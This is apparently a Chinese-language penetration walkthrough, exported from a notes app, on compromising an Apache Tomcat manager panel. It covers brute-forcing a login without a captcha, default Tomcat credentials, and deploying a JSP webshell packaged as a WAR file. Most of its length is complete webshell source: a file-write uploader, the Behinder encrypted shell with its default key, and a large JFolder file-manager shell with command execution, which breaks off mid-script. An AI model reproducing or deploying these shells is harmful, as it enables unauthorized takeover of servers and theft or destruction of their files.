<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619329131808.png" alt="1619329131808"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619329484692.png" alt="1619329484692"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619329494731.png" alt="1619329494731"></p>
<p>访问一下</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619329569867.png" alt="1619329569867"></p>
<p>访问一下它的后台管理地址</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/manager/html</span><br></pre></td></tr></table></div></figure>





<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619329613901.png" alt="1619329613901"></p>
<p>或者点这里</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619329717080.png" alt="1619329717080"></p>
<p>它的登录窗口是没有验证码的  直接爆破就可以</p>
<p>默认</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Users：TomcatPasswd：Tomcat</span><br></pre></td></tr></table></div></figure>



<p>登录进去之后 进行查看</p>
<p>文件上传war包</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619329890433.png" alt="1619329890433"></p>
<p><strong>为什么需要上传wa包，为什么不是 tar.zip？？</strong></p>
<p>war包是用来进行Web开发时一个网站项目下的所有代码，包括前台HTML/CSS/JS代码，以及后台 JavaWeb的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录，当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p>
<p>上传JSP的大马</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page contentType=&quot;text/html;charset=gb2312&quot;%&gt;    &lt;%@page import=&quot;java.io.*,java.util.*,java.net.*&quot;%&gt;    &lt;html&gt;      &lt;head&gt;        &lt;title&gt;&lt;/title&gt;        &lt;style type=&quot;text/css&quot;&gt;         body &#123; color:red; font-size:12px; background-color:white; &#125;        &lt;/style&gt;      &lt;/head&gt;      &lt;body&gt;      &lt;%       if(request.getParameter(&quot;context&quot;)!=null)       &#123;       String context=new String(request.getParameter(&quot;context&quot;).getBytes(&quot;ISO-8859-1&quot;),&quot;gb2312&quot;);       String path=new String(request.getParameter(&quot;path&quot;).getBytes(&quot;ISO-8859-1&quot;),&quot;gb2312&quot;);       OutputStream pt = null;            try &#123;                pt = new FileOutputStream(path);                pt.write(context.getBytes());                out.println(&quot;&lt;a href=&#x27;&quot;+request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+request.getRequestURI()+&quot;&#x27;&gt;&lt;font color=&#x27;red&#x27; title=&#x27;点击可以转到上传的文件页面!&#x27;&gt;上传成功!&lt;/font&gt;&lt;/a&gt;&quot;);            &#125; catch (FileNotFoundException ex2) &#123;                out.println(&quot;&lt;font color=&#x27;red&#x27;&gt;上传失败!&lt;/font&gt;&quot;);            &#125; catch (IOException ex) &#123;                out.println(&quot;&lt;font color=&#x27;red&#x27;&gt;上传失败!&lt;/font&gt;&quot;);            &#125; finally &#123;                try &#123;                    pt.close();                &#125; catch (IOException ex3) &#123;                    out.println(&quot;&lt;font color=&#x27;red&#x27;&gt;上传失败!&lt;/font&gt;&quot;);                &#125;            &#125;    &#125;      %&gt;        &lt;form name=&quot;frmUpload&quot; method=&quot;post&quot; action=&quot;&quot;&gt;        &lt;font color=&quot;blue&quot;&gt;本文件的路径:&lt;/font&gt;&lt;%out.print(request.getRealPath(request.getServletPath())); %&gt;        &lt;br&gt;        &lt;br&gt;        &lt;font color=&quot;blue&quot;&gt;上传文件路径:&lt;/font&gt;&lt;input type=&quot;text&quot; size=&quot;70&quot; name=&quot;path&quot; value=&quot;&lt;%out.print(getServletContext().getRealPath(&quot;/&quot;)); %&gt;&quot;&gt;        &lt;br&gt;        &lt;br&gt;        上传文件内容:&lt;textarea name=&quot;context&quot; id=&quot;context&quot; style=&quot;width: 51%; height: 150px;&quot;&gt;&lt;/textarea&gt;        &lt;br&gt;        &lt;br&gt;        &lt;input type=&quot;submit&quot; name=&quot;btnSubmit&quot; value=&quot;Upload&quot;&gt;        &lt;/form&gt;      &lt;/body&gt;    &lt;/html&gt;   </span><br></pre></td></tr></table></div></figure>





<p>zip压缩 然后改后缀 成war的包</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619339840138.png" alt="1619339840138"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619339862773.png" alt="1619339862773"></p>
<p>这里的<code>/2</code> 就是war包的名字</p>
<p>去docker底层看看是否成功上传</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619339911577.png" alt="1619339911577"></p>
<p> 它会自动部署  那我们访问一下</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619332041600.png" alt="1619332041600"></p>
<p>成功解析jsp大马，并能 upload上传功能！</p>
<p>这里上传冰蝎的jsp马儿</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></div></figure>



<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br></pre></td></tr></table></div></figure>

<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619340379288.png" alt="1619340379288"></p>
<p>upload之后 上冰蝎进行连接</p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619340324001.png" alt="1619340324001"></p>
<p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619340439690.png" alt="1619340439690"></p>
<p>在贴一个牛逼的JSP大马</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%/**JFolder V0.9  windows platform@Filename： JFolder.jsp @Description： 一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能较弱。@Bugs  :  下载时，中文文件名无法正常显示*/%&gt;&lt;%@ page contentType=&quot;text/html;charset=gb2312&quot;%&gt;&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*&quot; %&gt;&lt;%!private final static int languageNo=0; //语言版本，0 : 中文； 1：英文String strThisFile=&quot;JFolder.jsp&quot;;String[] authorInfo=&#123;&quot; &lt;font color=red&gt; 岁月联盟-专用版 &lt;/font&gt;&quot;,&quot; &lt;font color=red&gt; Thanks for your support - - by Steven Cee http:// &lt;/font&gt;&quot;&#125;;String[] strFileManage   = &#123;&quot;文 件 管 理&quot;,&quot;File Management&quot;&#125;;String[] strCommand      = &#123;&quot;CMD 命 令&quot;,&quot;Command Window&quot;&#125;;String[] strSysProperty  = &#123;&quot;系 统 属 性&quot;,&quot;System Property&quot;&#125;;String[] strHelp         = &#123;&quot;帮 助&quot;,&quot;Help&quot;&#125;;String[] strParentFolder = &#123;&quot;上级目录&quot;,&quot;Parent Folder&quot;&#125;;String[] strCurrentFolder= &#123;&quot;当前目录&quot;,&quot;Current Folder&quot;&#125;;String[] strDrivers      = &#123;&quot;驱动器&quot;,&quot;Drivers&quot;&#125;;String[] strFileName     = &#123;&quot;文件名称&quot;,&quot;File Name&quot;&#125;;String[] strFileSize     = &#123;&quot;文件大小&quot;,&quot;File Size&quot;&#125;;String[] strLastModified = &#123;&quot;最后修改&quot;,&quot;Last Modified&quot;&#125;;String[] strFileOperation= &#123;&quot;文件操作&quot;,&quot;Operations&quot;&#125;;String[] strFileEdit     = &#123;&quot;修改&quot;,&quot;Edit&quot;&#125;;String[] strFileDown     = &#123;&quot;下载&quot;,&quot;Download&quot;&#125;;String[] strFileCopy     = &#123;&quot;复制&quot;,&quot;Move&quot;&#125;;String[] strFileDel      = &#123;&quot;删除&quot;,&quot;Delete&quot;&#125;;String[] strExecute      = &#123;&quot;执行&quot;,&quot;Execute&quot;&#125;;String[] strBack         = &#123;&quot;返回&quot;,&quot;Back&quot;&#125;;String[] strFileSave     = &#123;&quot;保存&quot;,&quot;Save&quot;&#125;;public class FileHandler&#123; private String strAction=&quot;&quot;; private String strFile=&quot;&quot;; void FileHandler(String action,String f) &#123;  &#125;&#125;public static class UploadMonitor &#123;  static Hashtable uploadTable = new Hashtable();  static void set(String fName, UplInfo info) &#123;   uploadTable.put(fName, info);  &#125;  static void remove(String fName) &#123;   uploadTable.remove(fName);  &#125;  static UplInfo getInfo(String fName) &#123;   UplInfo info = (UplInfo) uploadTable.get(fName);   return info;  &#125;&#125;public class UplInfo &#123;  public long totalSize;  public long currSize;  public long starttime;  public boolean aborted;  public UplInfo() &#123;   totalSize = 0l;   currSize = 0l;   starttime = System.currentTimeMillis();   aborted = false;  &#125;  public UplInfo(int size) &#123;   totalSize = size;   currSize = 0;   starttime = System.currentTimeMillis();   aborted = false;  &#125;  public String getUprate() &#123;   long time = System.currentTimeMillis() - starttime;   if (time != 0) &#123;    long uprate = currSize * 1000 / time;    return convertFileSize(uprate) + &quot;/s&quot;;   &#125;   else return &quot;n/a&quot;;  &#125;  public int getPercent() &#123;   if (totalSize == 0) return 0;   else return (int) (currSize * 100 / totalSize);  &#125;  public String getTimeElapsed() &#123;   long time = (System.currentTimeMillis() - starttime) / 1000l;   if (time - 60l &gt;= 0)&#123;    if (time % 60 &gt;=10) return time / 60 + &quot;:&quot; + (time % 60) + &quot;m&quot;;    else return time / 60 + &quot;:0&quot; + (time % 60) + &quot;m&quot;;   &#125;   else return time&lt;10 ? &quot;0&quot; + time + &quot;s&quot;: time + &quot;s&quot;;  &#125;  public String getTimeEstimated() &#123;   if (currSize == 0) return &quot;n/a&quot;;   long time = System.currentTimeMillis() - starttime;   time = totalSize * time / currSize;   time /= 1000l;   if (time - 60l &gt;= 0)&#123;    if (time % 60 &gt;=10) return time / 60 + &quot;:&quot; + (time % 60) + &quot;m&quot;;    else return time / 60 + &quot;:0&quot; + (time % 60) + &quot;m&quot;;   &#125;   else return time&lt;10 ? &quot;0&quot; + time + &quot;s&quot;: time + &quot;s&quot;;  &#125; &#125; public class FileInfo &#123;  public String name = null, clientFileName = null, fileContentType = null;  private byte[] fileContents = null;  public File file = null;  public StringBuffer sb = new StringBuffer(100);  public void setFileContents(byte[] aByteArray) &#123;   fileContents = new byte[aByteArray.length];   System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);  &#125;&#125;// A Class with methods used to process a ServletInputStreampublic class HttpMultiPartParser &#123;  private final String lineSeparator = System.getProperty(&quot;line.separator&quot;, &quot;\n&quot;);  private final int ONE_MB = 1024 * 1;  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,    int clength) throws IllegalArgumentException, IOException &#123;   if (is == null) throw new IllegalArgumentException(&quot;InputStream&quot;);   if (boundary == null || boundary.trim().length() &lt; 1) throw new IllegalArgumentException(     &quot;\&quot;&quot; + boundary + &quot;\&quot; is an illegal boundary indicator&quot;);   boundary = &quot;--&quot; + boundary;   StringTokenizer stLine = null, stFields = null;   FileInfo fileInfo = null;   Hashtable dataTable = new Hashtable(5);   String line = null, field = null, paramName = null;   boolean saveFiles = (saveInDir != null &amp;&amp; saveInDir.trim().length() &gt; 0);   boolean isFile = false;   if (saveFiles) &#123; // Create the required directory (including parent dirs)    File f = new File(saveInDir);    f.mkdirs();   &#125;   line = getLine(is);   if (line == null || !line.startsWith(boundary)) throw new IOException(     &quot;Boundary not found; boundary = &quot; + boundary + &quot;, line = &quot; + line);   while (line != null) &#123;    if (line == null || !line.startsWith(boundary)) return dataTable;    line = getLine(is);    if (line == null) return dataTable;    stLine = new StringTokenizer(line, &quot;;\r\n&quot;);    if (stLine.countTokens() &lt; 2) throw new IllegalArgumentException(      &quot;Bad data in second line&quot;);    line = stLine.nextToken().toLowerCase();    if (line.indexOf(&quot;form-data&quot;) &lt; 0) throw new IllegalArgumentException(      &quot;Bad data in second line&quot;);    stFields = new StringTokenizer(stLine.nextToken(), &quot;=\&quot;&quot;);    if (stFields.countTokens() &lt; 2) throw new IllegalArgumentException(      &quot;Bad data in second line&quot;);    fileInfo = new FileInfo();    stFields.nextToken();    paramName = stFields.nextToken();    isFile = false;    if (stLine.hasMoreTokens()) &#123;     field = stLine.nextToken();     stFields = new StringTokenizer(field, &quot;=\&quot;&quot;);     if (stFields.countTokens() &gt; 1) &#123;      if (stFields.nextToken().trim().equalsIgnoreCase(&quot;filename&quot;)) &#123;       fileInfo.name = paramName;       String value = stFields.nextToken();       if (value != null &amp;&amp; value.trim().length() &gt; 0) &#123;        fileInfo.clientFileName = value;        isFile = true;       &#125;       else &#123;        line = getLine(is); // Skip &quot;Content-Type:&quot; line        line = getLine(is); // Skip blank line        line = getLine(is); // Skip blank line        line = getLine(is); // Position to boundary line        continue;       &#125;      &#125;     &#125;     else if (field.toLowerCase().indexOf(&quot;filename&quot;) &gt;= 0) &#123;      line = getLine(is); // Skip &quot;Content-Type:&quot; line      line = getLine(is); // Skip blank line      line = getLine(is); // Skip blank line      line = getLine(is); // Position to boundary line      continue;     &#125;    &#125;    boolean skipBlankLine = true;    if (isFile) &#123;     line = getLine(is);     if (line == null) return dataTable;     if (line.trim().length() &lt; 1) skipBlankLine = false;     else &#123;      stLine = new StringTokenizer(line, &quot;: &quot;);      if (stLine.countTokens() &lt; 2) throw new IllegalArgumentException(        &quot;Bad data in third line&quot;);      stLine.nextToken(); // Content-Type      fileInfo.fileContentType = stLine.nextToken();     &#125;    &#125;if (skipBlankLine) &#123;     line = getLine(is);     if (line == null) return dataTable;    &#125;    if (!isFile) &#123;     line = getLine(is);     if (line == null) return dataTable;     dataTable.put(paramName, line);     // If parameter is dir, change saveInDir to dir     if (paramName.equals(&quot;dir&quot;)) saveInDir = line;     line = getLine(is);     continue;    &#125;    try &#123;     UplInfo uplInfo = new UplInfo(clength);     UploadMonitor.set(fileInfo.clientFileName, uplInfo);     OutputStream os = null;     String path = null;     if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,       fileInfo.clientFileName));     else os = new ByteArrayOutputStream(ONE_MB);     boolean readingContent = true;     byte previousLine[] = new byte[2 * ONE_MB];     byte temp[] = null;     byte currentLine[] = new byte[2 * ONE_MB];     int read, read3;     if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) &#123;      line = null;      break;     &#125;     while (readingContent) &#123;      if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) &#123;       line = null;       uplInfo.aborted = true;       break;      &#125;      if (compareBoundary(boundary, currentLine)) &#123;       os.write(previousLine, 0, read - 2);       line = new String(currentLine, 0, read3);       break;      &#125;      else &#123;       os.write(previousLine, 0, read);       uplInfo.currSize += read;       temp = currentLine;       currentLine = previousLine;       previousLine = temp;       read = read3;      &#125;//end else     &#125;//end while     os.flush();     os.close();     if (!saveFiles) &#123;      ByteArrayOutputStream baos = (ByteArrayOutputStream) os;      fileInfo.setFileContents(baos.toByteArray());     &#125;     else fileInfo.file = new File(path);     dataTable.put(paramName, fileInfo);     uplInfo.currSize = uplInfo.totalSize;    &#125;//end try    catch (IOException e) &#123;     throw e;    &#125;   &#125;   return dataTable;  &#125;  /**   * Compares boundary string to byte array   */  private boolean compareBoundary(String boundary, byte ba[]) &#123;   byte b;   if (boundary == null || ba == null) return false;   for (int i = 0; i &lt; boundary.length(); i++)    if ((byte) boundary.charAt(i) != ba[i]) return false;   return true;  &#125;  /** Convenience method to read HTTP header lines */  private synchronized String getLine(ServletInputStream sis) throws IOException &#123;   byte b[] = new byte[1024];   int read = sis.readLine(b, 0, b.length), index;   String line = null;   if (read != -1) &#123;    line = new String(b, 0, read);    if ((index = line.indexOf(&#x27;\n&#x27;)) &gt;= 0) line = line.substring(0, index - 1);   &#125;   return line;  &#125;  public String getFileName(String dir, String fileName) throws IllegalArgumentException &#123;   String path = null;   if (dir == null || fileName == null) throw new IllegalArgumentException(     &quot;dir or fileName is null&quot;);   int index = fileName.lastIndexOf(&#x27;/&#x27;);   String name = null;   if (index &gt;= 0) name = fileName.substring(index + 1);   else name = fileName;   index = name.lastIndexOf(&#x27;\\&#x27;);   if (index &gt;= 0) fileName = name.substring(index + 1);   path = dir + File.separator + fileName;   if (File.separatorChar == &#x27;/&#x27;) return path.replace(&#x27;\\&#x27;, File.separatorChar);   else return path.replace(&#x27;/&#x27;, File.separatorChar);  &#125;&#125; //End of class HttpMultiPartParserString formatPath(String p)&#123; StringBuffer sb=new StringBuffer(); for (int i = 0; i &lt; p.length(); i++)  &#123;  if(p.charAt(i)==&#x27;\\&#x27;)  &#123;   sb.append(&quot;\\\\&quot;);  &#125;  else  &#123;   sb.append(p.charAt(i));  &#125; &#125; return sb.toString();&#125; /**  * Converts some important chars (int) to the corresponding html string  */ static String conv2Html(int i) &#123;  if (i == &#x27;&amp;&#x27;) return &quot;&amp;amp;&quot;;  else if (i == &#x27;&lt;&#x27;) return &quot;&amp;lt;&quot;;  else if (i == &#x27;&gt;&#x27;) return &quot;&amp;gt;&quot;;  else if (i == &#x27;&quot;&#x27;) return &quot;&amp;quot;&quot;;  else return &quot;&quot; + (char) i; &#125; /**  * Converts a normal string to a html conform string  */ static String htmlEncode(String st) &#123;  StringBuffer buf = new StringBuffer();  for (int i = 0; i &lt; st.length(); i++) &#123;   buf.append(conv2Html(st.charAt(i)));  &#125;  return buf.toString(); &#125;String getDrivers()/**Windows系统上取得可用的所有逻辑盘*/&#123; StringBuffer sb=new StringBuffer(strDrivers[languageNo] + &quot; : &quot;); File roots[]=File.listRoots(); for(int i=0;i&lt;roots.length;i++) &#123;  sb.append(&quot; &lt;a href=\&quot;javascript:doForm(&#x27;&#x27;,&#x27;&quot;+roots[i]+&quot;\\&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;1&#x27;,&#x27;&#x27;);\&quot;&gt;&quot;);  sb.append(roots[i]+&quot;&lt;/a&gt;&amp;nbsp;&quot;); &#125; return sb.toString();&#125;static String convertFileSize(long filesize)&#123; //bug 5.09M 显示5.9M String strUnit=&quot;Bytes&quot;; String strAfterComma=&quot;&quot;; int intDivisor=1; if(filesize&gt;=1024*1024) &#123;  strUnit = &quot;MB&quot;;  intDivisor=1024*1024; &#125; else if(filesize&gt;=1024) &#123;  strUnit = &quot;KB&quot;;  intDivisor=1024; &#125; if(intDivisor==1) return filesize + &quot; &quot; + strUnit; strAfterComma = &quot;&quot; + 100 * (filesize % intDivisor) / intDivisor ; if(strAfterComma==&quot;&quot;) strAfterComma=&quot;.0&quot;; return filesize / intDivisor + &quot;.&quot; + strAfterComma + &quot; &quot; + strUnit;&#125;%&gt;&lt;%request.setCharacterEncoding(&quot;gb2312&quot;);String tabID = request.getParameter(&quot;tabID&quot;);String strDir = request.getParameter(&quot;path&quot;);String strAction = request.getParameter(&quot;action&quot;);String strFile = request.getParameter(&quot;file&quot;);String strPath = strDir + &quot;\\&quot; + strFile; String strCmd = request.getParameter(&quot;cmd&quot;);StringBuffer sbEdit=new StringBuffer(&quot;&quot;);StringBuffer sbDown=new StringBuffer(&quot;&quot;);StringBuffer sbCopy=new StringBuffer(&quot;&quot;);StringBuffer sbSaveCopy=new StringBuffer(&quot;&quot;);StringBuffer sbNewFile=new StringBuffer(&quot;&quot;);if((tabID==null) || tabID.equals(&quot;&quot;))&#123; tabID = &quot;1&quot;;&#125;if(strDir==null||strDir.length()&lt;1)&#123; strDir = request.getRealPath(&quot;/&quot;);&#125;if(strAction!=null &amp;&amp; strAction.equals(&quot;down&quot;))&#123; File f=new File(strPath); if(f.length()==0) &#123;  sbDown.append(&quot;文件大小为 0 字节，就不用下了吧&quot;); &#125; else &#123;  response.setHeader(&quot;content-type&quot;,&quot;text/html; charset=ISO-8859-1&quot;);  response.setContentType(&quot;APPLICATION/OCTET-STREAM&quot;);   response.setHeader(&quot;Content-Disposition&quot;,&quot;attachment; filename=\&quot;&quot;+f.getName()+&quot;\&quot;&quot;);  FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());  out.clearBuffer();  int i;  while ((i=fileInputStream.read()) != -1)  &#123;   out.write(i);   &#125;  fileInputStream.close();  out.close(); &#125;&#125;if(strAction!=null &amp;&amp; strAction.equals(&quot;del&quot;))&#123; File f=new File(strPath); f.delete();&#125;if(strAction!=null &amp;&amp; strAction.equals(&quot;edit&quot;))&#123; File f=new File(strPath);  BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f))); sbEdit.append(&quot;&lt;form name=&#x27;frmEdit&#x27; action=&#x27;&#x27; method=&#x27;POST&#x27;&gt;\r\n&quot;); sbEdit.append(&quot;&lt;input type=hidden name=action value=save &gt;\r\n&quot;); sbEdit.append(&quot;&lt;input type=hidden name=path value=&#x27;&quot;+strDir+&quot;&#x27; &gt;\r\n&quot;); sbEdit.append(&quot;&lt;input type=hidden name=file value=&#x27;&quot;+strFile+&quot;&#x27; &gt;\r\n&quot;); sbEdit.append(&quot;&lt;input type=submit name=save value=&#x27; &quot;+strFileSave[languageNo]+&quot; &#x27;&gt; &quot;); sbEdit.append(&quot;&lt;input type=button name=goback value=&#x27; &quot;+strBack[languageNo]+&quot; &#x27; onclick=&#x27;history.back(-1);&#x27;&gt; &amp;nbsp;&quot;+strPath+&quot;\r\n&quot;); sbEdit.append(&quot;&lt;br&gt;&lt;textarea rows=30 cols=90 name=content&gt;&quot;); String line=&quot;&quot;; while((line=br.readLine())!=null) &#123;  sbEdit.append(htmlEncode(line)+&quot;\r\n&quot;);   &#125;   sbEdit.append(&quot;&lt;/textarea&gt;&quot;); sbEdit.append(&quot;&lt;input type=hidden name=path value=&quot;+strDir+&quot;&gt;&quot;); sbEdit.append(&quot;&lt;/form&gt;&quot;);&#125;if(strAction!=null &amp;&amp; strAction.equals(&quot;save&quot;))&#123; File f=new File(strPath); BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f))); String strContent=request.getParameter(&quot;content&quot;); bw.write(strContent); bw.close();&#125;if(strAction!=null &amp;&amp; strAction.equals(&quot;copy&quot;))&#123; File f=new File(strPath); sbCopy.append(&quot;&lt;br&gt;&lt;form name=&#x27;frmCopy&#x27; action=&#x27;&#x27; method=&#x27;POST&#x27;&gt;\r\n&quot;); sbCopy.append(&quot;&lt;input type=hidden name=action value=savecopy &gt;\r\n&quot;); sbCopy.append(&quot;&lt;input type=hidden name=path value=&#x27;&quot;+strDir+&quot;&#x27; &gt;\r\n&quot;); sbCopy.append(&quot;&lt;input type=hidden name=file value=&#x27;&quot;+strFile+&quot;&#x27; &gt;\r\n&quot;); sbCopy.append(&quot;原始文件： &quot;+strPath+&quot;&lt;p&gt;&quot;); sbCopy.append(&quot;目标文件： &lt;input type=text name=file2 size=40 value=&#x27;&quot;+strDir+&quot;&#x27;&gt;&lt;p&gt;&quot;); sbCopy.append(&quot;&lt;input type=submit name=save value=&#x27; &quot;+strFileCopy[languageNo]+&quot; &#x27;&gt; &quot;); sbCopy.append(&quot;&lt;input type=button name=goback value=&#x27; &quot;+strBack[languageNo]+&quot; &#x27; onclick=&#x27;history.back(-1);&#x27;&gt; &lt;p&gt;&amp;nbsp;\r\n&quot;); sbCopy.append(&quot;&lt;/form&gt;&quot;);&#125;if(strAction!=null &amp;&amp; strAction.equals(&quot;savecopy&quot;))&#123; File f=new File(strPath); String strDesFile=request.getParameter(&quot;file2&quot;); if(strDesFile==null || strDesFile.equals(&quot;&quot;)) &#123;  sbSaveCopy.append(&quot;&lt;p&gt;&lt;font color=red&gt;目标文件错误。&lt;/font&gt;&quot;); &#125; else &#123;  File f_des=new File(strDesFile);  if(f_des.isFile())  &#123;   sbSaveCopy.append(&quot;&lt;p&gt;&lt;font color=red&gt;目标文件已存在,不能复制。&lt;/font&gt;&quot;);  &#125;  else  &#123;   String strTmpFile=strDesFile;   if(f_des.isDirectory())   &#123;    if(!strDesFile.endsWith(&quot;\\&quot;))    &#123;     strDesFile=strDesFile+&quot;\\&quot;;    &#125;    strTmpFile=strDesFile+&quot;cqq_&quot;+strFile;    &#125;      File f_des_copy=new File(strTmpFile);   FileInputStream in1=new FileInputStream(f);   FileOutputStream out1=new FileOutputStream(f_des_copy);   byte[] buffer=new byte[1024];   int c;   while((c=in1.read(buffer))!=-1)   &#123;    out1.write(buffer,0,c);   &#125;   in1.close();   out1.close();    sbSaveCopy.append(&quot;原始文件 ：&quot;+strPath+&quot;&lt;p&gt;&quot;);   sbSaveCopy.append(&quot;目标文件 ：&quot;+strTmpFile+&quot;&lt;p&gt;&quot;);   sbSaveCopy.append(&quot;&lt;font color=red&gt;复制成功！&lt;/font&gt;&quot;);     &#125;   &#125;  sbSaveCopy.append(&quot;&lt;p&gt;&lt;input type=button name=saveCopyBack onclick=&#x27;history.back(-2);&#x27; value=返回&gt;&quot;);&#125;if(strAction!=null &amp;&amp; strAction.equals(&quot;newFile&quot;))&#123; String strF=request.getParameter(&quot;fileName&quot;); String strType1=request.getParameter(&quot;btnNewFile&quot;); String strType2=request.getParameter(&quot;btnNewDir&quot;); String strType=&quot;&quot;; if(strType1==null) &#123;  strType=&quot;Dir&quot;; &#125; else if(strType2==null) &#123;  strType=&quot;File&quot;; &#125; if(!strType.equals(&quot;&quot;) &amp;&amp; !(strF==null || strF.equals(&quot;&quot;))) &#123;     File f_new=new File(strF);      if(strType.equals(&quot;File&quot;) &amp;&amp; !f_new.createNewFile())    sbNewFile.append(strF+&quot; 文件创建失败&quot;);   if(strType.equals(&quot;Dir&quot;) &amp;&amp; !f_new.mkdirs())    sbNewFile.append(strF+&quot; 目录创建失败&quot;); &#125; else &#123;  sbNewFile.append(&quot;&lt;p&gt;&lt;font color=red&gt;建立文件或目录出错。&lt;/font&gt;&quot;); &#125;&#125;if((request.getContentType()!= null) &amp;&amp; (request.getContentType().toLowerCase().startsWith(&quot;multipart&quot;)))&#123; String tempdir=&quot;.&quot;; boolean error=false; response.setContentType(&quot;text/html&quot;); sbNewFile.append(&quot;&lt;p&gt;&lt;font color=red&gt;建立文件或目录出错。&lt;/font&gt;&quot;); HttpMultiPartParser parser = new HttpMultiPartParser(); int bstart = request.getContentType().lastIndexOf(&quot;oundary=&quot;); String bound = request.getContentType().substring(bstart + 8); int clength = request.getContentLength(); Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength); if (ht.get(&quot;cqqUploadFile&quot;) != null) &#123;  FileInfo fi = (FileInfo) ht.get(&quot;cqqUploadFile&quot;);  File f1 = fi.file;  UplInfo info = UploadMonitor.getInfo(fi.clientFileName);  if (info != null &amp;&amp; info.aborted)   &#123;   f1.delete();   request.setAttribute(&quot;error&quot;, &quot;Upload aborted&quot;);  &#125;  else   &#123;   String path = (String) ht.get(&quot;path&quot;);   if(path!=null &amp;&amp; !path.endsWith(&quot;\\&quot;))     path = path + &quot;\\&quot;;   if (!f1.renameTo(new File(path + f1.getName())))    &#123;    request.setAttribute(&quot;error&quot;, &quot;Cannot upload file.&quot;);    error = true;    f1.delete();   &#125;  &#125; &#125;&#125;%&gt;&lt;html&gt;&lt;head&gt;&lt;style type=&quot;text/css&quot;&gt;td,select,input,body&#123;font-size:9pt;&#125;A &#123; TEXT-DECORATION: none &#125;#tablist&#123;padding: 5px 0;margin-left: 0;margin-bottom: 0;margin-top: 0.1em;font:9pt;&#125;#tablist li&#123;list-style: none;display: inline;margin: 0;&#125;#tablist li a&#123;padding: 3px 0.5em;margin-left: 3px;border: 1px solid ;background: F6F6F6;&#125;#tablist li a:link, #tablist li a:visited&#123;color: navy;&#125;#tablist li a.current&#123;background: #EAEAFF;&#125;#tabcontentcontainer&#123;width: 100%;padding: 5px;border: 1px solid black;&#125;.tabcontent&#123;display:none;&#125;&lt;/style&gt;&lt;script type=&quot;text/javascript&quot;&gt;var initialtab=[&lt;%=tabID%&gt;, &quot;menu&lt;%=tabID%&gt;&quot;]////////Stop editting////////////////function cascadedstyle(el, cssproperty, csspropertyNS)&#123;if (el.currentStyle)return el.currentStyle[cssproperty]else if (window.getComputedStyle)&#123;var elstyle=window.getComputedStyle(el, &quot;&quot;)return elstyle.getPropertyValue(csspropertyNS)&#125;&#125;var previoustab=&quot;&quot;function expandcontent(cid, aobject)&#123;if (document.getElementById)&#123;highlighttab(aobject)if (previoustab!=&quot;&quot;)document.getElementById(previoustab).style.display=&quot;none&quot;document.getElementById(cid).style.display=&quot;block&quot;previoustab=cidif (aobject.blur)aobject.blur()return false&#125;elsereturn true&#125;function highlighttab(aobject)&#123;if (typeof tabobjlinks==&quot;undefined&quot;)collecttablinks()for (i=0; i&lt;tabobjlinks.length; i++)tabobjlinks[i].style.backgroundColor=initTabcolorvar themecolor=aobject.getAttribute(&quot;theme&quot;)? 